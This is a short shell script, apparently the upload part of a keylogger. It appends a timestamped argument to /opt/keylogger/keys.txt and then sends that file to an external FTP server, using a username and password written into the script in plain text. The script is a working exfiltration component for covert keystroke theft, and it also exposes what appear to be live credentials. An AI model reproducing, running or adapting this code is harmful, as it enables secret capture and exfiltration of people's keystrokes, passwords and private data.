#!/bin/sh
HOST='serwer1865222.home.pl'
USER='oskreans@serwer1865222.home.pl'
PASSWD='oshasLo1@'
PAT='/opt/keylogger'
FILE='keys.txt'

echo " `date` : $1 ">> $PAT/$FILE

ftp -p -n $HOST <<END_SCRIPT
quote USER $USER
quote PASS $PASSWD
asci
lcd $PAT
put $FILE
quit
END_SCRIPT
exit 0
